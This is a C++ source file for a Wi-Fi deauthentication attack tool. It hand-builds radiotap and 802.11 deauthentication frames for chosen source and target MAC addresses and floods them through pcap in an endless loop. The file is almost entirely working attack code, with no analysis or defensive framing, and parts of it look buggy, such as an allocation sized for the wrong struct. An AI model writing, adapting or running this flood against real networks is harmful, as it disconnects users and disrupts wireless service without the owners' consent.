#include "deauth-attack.h"

using namespace std;

bool MODE;
uint8_t *SRC_MAC;
uint8_t *DST_MAC;

void dump(unsigned char* buf, int size) {
    int i;
    for (i = 0; i < size; i++) {
        if (i != 0 && i % 16 == 0)
            printf("\n");
        printf("%02X ", buf[i]);
    }
    printf("\n");
}

void error(const char *msg) {
    warnx("Error: %s\n", msg);
    exit(-1);
}

uint8_t *translateMac(const char *mac) {
    uint8_t *buf = (uint8_t*)calloc(1, 6);
    const char *ptr = mac;
    for(int i = 0; i < 6; ++i) {
        buf[i] = strtoul((const char *)ptr, NULL, 16);
        while(*ptr++ != ':' && *ptr != '\0');
    }
    return buf;
}

void deauthAtk(pcap_t *pcap) {
    uint8_t packet[0x400];
    uint8_t *cur;
    const char *src;
    radiotap_header *rdtHdr;
    deauth *dPacket;
    rdtHdr = (radiotap_header*)calloc(1, sizeof(radiotap_header) + 1);
    dPacket = (deauth*)calloc(1, sizeof(radiotap_header) + 1);
    if(!rdtHdr || !dPacket) error("Can't allocate memory for packet");
    rdtHdr->hdrRvsn     = 0;
    rdtHdr->pad         = 0;
    rdtHdr->hdr_len     = 11;
    rdtHdr->pFlags      = 0x28000;
    rdtHdr->_pad[0]     = 0;
    rdtHdr->_pad[1]     = 0;
    rdtHdr->_pad[2]     = 0;
    dPacket->frmCtrlFld |= 0;
    dPacket->frmCtrlFld |= (MANAGE << 2);
    dPacket->frmCtrlFld |= (DEAUTH << 4);
    dPacket->dur        = 0;
    dPacket->nums       |= 0;
    dPacket->nums       |= (0 << 4);
    memcpy(dPacket->rcvrMac, DST_MAC, 6);
    memcpy(dPacket->srcMac, SRC_MAC, 6);
    memcpy(dPacket->bssid, SRC_MAC, 6);
    cur = packet;
    memcpy(cur, rdtHdr, 11);
    cur += 11;
    memcpy(cur, dPacket, sizeof(deauth));
    cur += sizeof(deauth);
    memcpy(cur, "\x07\x00", 2);
    free(rdtHdr);
    free(dPacket);
    free(SRC_MAC);
    if(strcmp((const char*)DST_MAC, BRD_MAC)) free(DST_MAC);
    dPacket = (deauth*)(packet + 11);
    while(true) {
        dPacket->nums += 0b10000;
        usleep(5000);
        pcap_sendpacket(pcap, packet, 11 + sizeof(deauth) + 2);
    }
}